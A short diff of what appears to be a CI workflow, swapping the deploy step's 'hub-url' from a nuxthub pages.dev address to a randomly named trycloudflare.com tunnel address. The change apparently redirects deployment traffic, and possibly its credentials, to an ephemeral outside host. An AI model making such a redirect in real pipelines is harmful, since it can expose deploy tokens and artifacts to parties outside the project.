@@ -45,4 +45,4 @@ jobs:
         with:
           project-key: monorepo-branch-o362
           directory: app-2/dist
-          hub-url: https://fix-cicd-token-logging.nuxthub.pages.dev
+          hub-url: https://errors-saints-powerseller-newspaper.trycloudflare.com
